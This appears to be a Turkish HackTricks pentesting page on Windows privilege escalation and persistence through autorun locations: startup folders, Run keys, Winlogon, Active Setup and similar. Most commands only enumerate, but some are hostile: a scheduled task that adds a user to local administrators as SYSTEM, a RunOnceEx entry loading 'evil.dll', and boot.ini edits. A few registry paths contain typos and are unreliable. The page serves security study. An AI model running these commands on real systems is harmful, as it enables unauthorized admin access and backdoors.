# Otomatik Başlatma Dosyalarıyla Ayrıcalık Yükseltme

<details>

<summary><strong>Sıfırdan kahraman olacak şekilde AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na(https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi**]'ni(https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'ler**]'imiz(https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'ı takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Hata ödülü ipucu**: **Intigriti'ye kaydolun**, hackerlar tarafından oluşturulan bir premium **hata ödülü platformu**! Bugün [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) adresinde bize katılın ve **$100,000**'a kadar ödüller kazanmaya başlayın!

{% embed url="https://go.intigriti.com/hacktricks" %}

## WMIC

**Wmic**, programların **başlangıçta çalıştırılması** için kullanılabilir. Başlangıçta çalıştırılacak olan dosyaları görmek için:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Zamanlanmış Görevler

**Görevler**, belirli bir sıklıkta çalıştırılmak üzere zamanlanabilir. Hangi ikili dosyaların çalıştırılacağını görmek için:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Klasörler

**Başlangıç klasörlerinde bulunan tüm ikili dosyalar başlangıçta çalıştırılacaktır**. Yaygın başlangıç klasörleri aşağıda listelenmiştir, ancak başlangıç klasörü kayıt defterinde belirtilir. [Nerede olduğunu öğrenmek için burayı okuyun.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
## Kayıt Defteri

{% hint style="info" %}
[Buradan not alın](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): **Wow6432Node** kayıt defteri girişi, 64 bit Windows sürümü çalıştırdığınızı gösterir. İşletim sistemi, 64 bit Windows sürümlerinde çalışan 32 bit uygulamalar için HKEY_LOCAL_MACHINE\SOFTWARE'nin ayrı bir görünümünü göstermek için bu anahtarı kullanır.
{% endhint %}

### Çalıştır

**Genellikle bilinen** AutoRun kayıt defteri:

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

**Run** ve **RunOnce** olarak bilinen kayıt defteri anahtarları, her kullanıcı oturum açtığında programları otomatik olarak çalıştırmak için tasarlanmıştır. Bir anahtarın veri değeri olarak atanan komut satırı, 260 karakterden az olmalıdır.

**Hizmet çalışmaları** (başlangıçta hizmetlerin otomatik olarak başlatılmasını kontrol edebilir):

* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

* `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
* `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Windows Vista ve sonraki sürümlerde, **Run** ve **RunOnce** kayıt defteri anahtarları otomatik olarak oluşturulmaz. Bu anahtarlar içindeki girişler ya programları doğrudan başlatabilir ya da bağımlılıklarını belirtebilir. Örneğin, bir DLL dosyasını oturum açılışında yüklemek için, "Depend" anahtarı ile birlikte **RunOnceEx** kayıt defteri anahtarını kullanabilirsiniz. Sistemin başlangıcında "C:\temp\evil.dll" dosyasını yürütmek için bir kayıt defteri girişi eklemek gösterilmiştir:
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
{% hint style="info" %}
**Sızma 1**: Eğer **HKLM** içinde belirtilen herhangi bir kayıt defterine yazabilirseniz, farklı bir kullanıcı oturum açtığında ayrıcalıkları yükseltebilirsiniz.
{% endhint %}

{% hint style="info" %}
**Sızma 2**: Eğer **HKLM** içinde belirtilen herhangi bir kayıt defterinde belirtilen herhangi bir ikili dosyayı üzerine yazabilirseniz, farklı bir kullanıcı oturum açtığında o ikili dosyayı bir arka kapı ile değiştirebilir ve ayrıcalıkları yükseltebilirsiniz.
{% endhint %}
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Başlangıç Yolu

* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

**Başlangıç** klasörüne yerleştirilen kısayollar, kullanıcı oturum açma veya sistem yeniden başlatma sırasında hizmetleri veya uygulamaları otomatik olarak başlatır. **Başlangıç** klasörünün konumu, hem **Yerel Makine** hem de **Geçerli Kullanıcı** kapsamları için kayıt defterinde tanımlanmıştır. Bu, belirtilen **Başlangıç** konumlarına eklenen herhangi bir kısayolun, bağlı hizmetin veya programın oturum açma veya yeniden başlatma işleminden sonra başlatılmasını sağlayacağı anlamına gelir, bu da programların otomatik olarak çalıştırılması için basit bir yöntem oluşturur.

{% hint style="info" %}
Eğer **HKLM** altında herhangi bir \[Kullanıcı] Shell Klasörünü üzerine yazabilirseniz, onu sizin kontrol ettiğiniz bir klasöre yönlendirebilir ve bir arka kapı yerleştirerek, bir kullanıcının sisteme oturum açtığında her zaman yürütülecek bir yol oluşturabilirsiniz.
{% endhint %}
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### Winlogon Anahtarları

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Genellikle, **Userinit** anahtarı **userinit.exe** olarak ayarlanmıştır. Ancak, bu anahtar değiştirilirse, belirtilen yürütülebilir dosya da kullanıcı oturum açtığında **Winlogon** tarafından başlatılacaktır. Benzer şekilde, **Shell** anahtarı varsayılan Windows kabuğu olan **explorer.exe**'ye işaret etmek amacıyla kullanılır.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
{% hint style="info" %}
Eğer kayıt defteri değerini veya ikili dosyayı üzerine yazabilirseniz ayrıcalıkları yükseltebilirsiniz.
{% endhint %}

### Politika Ayarları

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

**Run** anahtarını kontrol edin.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Güvenli Mod Komut İstemi Değiştirme

Windows Kayıt Defteri'nde `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot` altında varsayılan olarak `cmd.exe` olarak ayarlanmış bir **`AlternateShell`** değeri bulunmaktadır. Bu, başlangıçta "Komut İstemi ile Güvenli Mod" seçildiğinde (F8'e basarak) `cmd.exe`'nin kullanıldığı anlamına gelir. Ancak, bilgisayarınızı F8'e basmadan ve manuel olarak seçmeden bu modda otomatik olarak başlatmak mümkündür.

"Komut İstemi ile Güvenli Modda" otomatik olarak başlamak için bir önyükleme seçeneği oluşturma adımları:

1. `boot.ini` dosyasının salt okunur, sistem ve gizli bayraklarını kaldırmak için öznitelikleri değiştirin: `attrib c:\boot.ini -r -s -h`
2. `boot.ini` dosyasını düzenlemek için açın.
3. Şu şekilde bir satır ekleyin: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Yapılan değişiklikleri `boot.ini` dosyasına kaydedin.
5. Orijinal dosya özniteliklerini tekrar uygulayın: `attrib c:\boot.ini +r +s +h`

* **Sızma 1:** **AlternateShell** kayıt defteri anahtarını değiştirmek, yetkisiz erişim için özel komut kabuğu kurulumuna olanak tanır.
* **Sızma 2 (PATH Yazma İzinleri):** Sistemin herhangi bir bölümüne yazma izinlerine sahip olmak, özellikle `C:\Windows\system32`'den önce, özel bir `cmd.exe` yürütmenizi sağlar, bu da sistem Güvenli Modda başlatıldığında bir arka kapı olabilir.
* **Sızma 3 (PATH ve boot.ini Yazma İzinleri):** `boot.ini`'ye yazma erişimi, otomatik Güvenli Mod başlatmayı sağlar ve bir sonraki yeniden başlatmada yetkisiz erişimi kolaylaştırır.

Mevcut **AlternateShell** ayarını kontrol etmek için bu komutları kullanın:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Yüklü Bileşen

Active Setup, Windows'ta **masaüstü ortamı tam olarak yüklenmeden önce başlatılan** bir özelliktir. Belirli komutların yürütülmesine öncelik verir ve kullanıcı oturumu devam etmeden önce tamamlanması gereken bu komutları belirler. Bu işlem, Run veya RunOnce kayıt defteri bölümlerindeki girişler gibi diğer başlangıç girdilerinden önce gerçekleşir.

Active Setup, aşağıdaki kayıt defteri anahtarları aracılığıyla yönetilir:

* `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
* `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
* `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
* `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Bu anahtarlar içinde, belirli bir bileşene karşılık gelen çeşitli alt anahtarlar bulunmaktadır. Özellikle ilgi çekici anahtar değerleri şunlardır:

* **IsInstalled:**
  * `0`, bileşenin komutunun yürütülmeyeceğini gösterir.
  * `1`, komutun her kullanıcı için bir kez yürütüleceği anlamına gelir ve `IsInstalled` değeri eksikse varsayılan davranış budur.
* **StubPath:** Active Setup tarafından yürütülecek komutu tanımlar. Başlatma `notepad` gibi herhangi bir geçerli komut satırı olabilir.

**Güvenlik İpuçları:**

* **`IsInstalled`** değeri `"1"` olarak ayarlanmış bir anahtarı değiştirmek veya yazmak, belirli bir **`StubPath`** ile yetkisiz komut yürütme ve potansiyel olarak ayrıcalık yükseltme olasılığına yol açabilir.
* Herhangi bir **`StubPath`** değerinde referans verilen ikili dosyayı değiştirmek, yeterli izinlerle ayrıcalık yükseltmeyi başarabilir.

Active Setup bileşenlerindeki **`StubPath`** yapılandırmalarını incelemek için şu komutlar kullanılabilir:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Tarayıcı Yardımcı Nesneleri

### Tarayıcı Yardımcı Nesneleri (BHO'lar) Genel Bakışı

Tarayıcı Yardımcı Nesneleri (BHO'lar), Microsoft'un Internet Explorer'ına ekstra özellikler ekleyen DLL modülleridir. Her başlangıçta Internet Explorer ve Windows Explorer'a yüklenirler. Ancak, **NoExplorer** anahtarını 1 olarak ayarlayarak yüklenmeleri Windows Explorer örnekleriyle engellenebilir.

BHO'lar, Windows 10 ile Internet Explorer 11 üzerinden uyumludur ancak Microsoft Edge'de desteklenmezler, bu da Windows'un daha yeni sürümlerindeki varsayılan tarayıcıdır.

Sistemde kayıtlı BHO'ları keşfetmek için aşağıdaki kayıt defteri anahtarlarını inceleyebilirsiniz:

* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
* `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Her BHO, benzersiz bir tanımlayıcı olarak hizmet eden **CLSID**'si ile kayıt defterinde temsil edilir. Her CLSID hakkında detaylı bilgi, `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}` altında bulunabilir.

Kayıt defterinde BHO'ları sorgulamak için şu komutlar kullanılabilir:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Internet Explorer Uzantıları

* `HKLM\Software\Microsoft\Internet Explorer\Extensions`
* `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Kayıt defterinde her bir dll için 1 yeni kayıt bulunacağını ve bu kaydın **CLSID** tarafından temsil edileceğini unutmayın. CLSID bilgilerini `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}` içinde bulabilirsiniz.

### Yazı Tipi Sürücüleri

* `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
* `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Açık Komut

* `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
* `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Görüntü Dosyası Yürütme Seçenekleri
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Unutmayın ki, autorun dosyalarını bulabileceğiniz tüm siteler zaten **winpeas.exe** tarafından aranmıştır. Ancak, daha kapsamlı bir otomatik olarak çalıştırılan dosya listesi için [systinternals'den autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)'u kullanabilirsiniz:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Daha Fazla

**Registrelerdeki gibi Autorun'ları bulmak için** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)

## Referanslar

* [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
* [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
* [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)
* [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Hata ödülü ipucu**: **Intigriti'ye kaydolun**, hackerlar tarafından oluşturulan bir premium **hata ödülü platformu**! Bugün [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) adresinde bize katılın ve **100.000 $'a kadar ödüller kazanmaya başlayın**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi Twitter'da** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
